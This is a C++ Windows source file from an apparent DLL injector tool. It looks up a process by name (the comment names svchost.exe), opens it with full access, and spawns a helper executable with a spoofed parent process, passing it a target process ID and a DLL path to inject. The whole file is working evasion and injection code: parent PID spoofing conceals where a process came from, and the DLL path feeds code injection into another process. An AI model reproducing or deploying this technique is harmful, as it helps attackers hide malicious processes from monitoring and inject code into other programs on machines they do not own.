
#include <Windows.h>
#include <TlHelp32.h>
#include <thread>

#include "Injector.h"

DWORD GetProcessIdFromName(const wchar_t* targetProcess)
{
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (_wcsicmp(entry.szExeFile, targetProcess) == 0)
            {
                CloseHandle(snapshot);
                return entry.th32ProcessID;
            }
        }
    }
    CloseHandle(snapshot);
    return 0;
}

DWORD deleguateInjection(int targetProcess)
{
    // Open svchost.exe
    auto PID = GetProcessIdFromName(PPID_SPOOFED);
    if (!PID) {
        return -1;
    }
    HANDLE hExplorer = OpenProcess(PROCESS_ALL_ACCESS, false, PID);
    if (!hExplorer) {
        return -1;
    }

    /// Initialize the startupinfo and PPID
    STARTUPINFOEXW sInfo;
    PROCESS_INFORMATION pInfo;
    SIZE_T size = 0;
    ZeroMemory(&sInfo, sizeof(sInfo));
    ZeroMemory(&pInfo, sizeof(pInfo));

    // Get needed space for attribute list
    bool bRet = InitializeProcThreadAttributeList(NULL, 1, 0, &size);
    if (bRet || size == 0) {
        return -1;
    }
    // Allocate memory
    sInfo.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
    if (!sInfo.lpAttributeList) {
        return -1;
    }
    // Initialize attribute list
    bRet = InitializeProcThreadAttributeList(sInfo.lpAttributeList, 1, 0, &size);
    if (!bRet || !sInfo.lpAttributeList) {
        return -1;
    }
    // Put in the parent process attribute
    bRet = UpdateProcThreadAttribute(sInfo.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hExplorer, sizeof(hExplorer), NULL, NULL);
    if (!bRet) {
        return -1;
    }
    sInfo.StartupInfo.cb = sizeof(sInfo);

    // Initialize temp folder and command line
    WCHAR tempFolder[MAX_PATH];
    GetTempPathW(MAX_PATH, tempFolder);

    LPWSTR swCmdLine = (LPWSTR)malloc(MAX_PATH * 4);
    if (!swCmdLine) {
        return -1;
    }
    memset(swCmdLine, 0, MAX_PATH * 4);

    lstrcatW(swCmdLine, EXE_FULL_PATH);
    lstrcatW(swCmdLine, L" " );

    LPWSTR swPID = (LPWSTR)malloc(MAX_PATH);
    if (!swPID) {
        return -1;
    }
    memset(swPID, 0, MAX_PATH);
    _itow(targetProcess, swPID, 10);
    lstrcatW(swCmdLine, swPID);

    lstrcatW(swCmdLine, L" ");

    lstrcatW(swCmdLine, DLL_FULL_PATH);

    // Spawn the process
    auto ret = CreateProcessW(NULL, swCmdLine, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, tempFolder, (LPSTARTUPINFOW)&sInfo, &pInfo);
    if (!ret) {
        ret = GetLastError();
    }
    else {
        ret = targetProcess;
    }

    free(swPID);
    free(swCmdLine);

    CloseHandle(pInfo.hProcess);
    CloseHandle(pInfo.hThread);

    return ret;
}
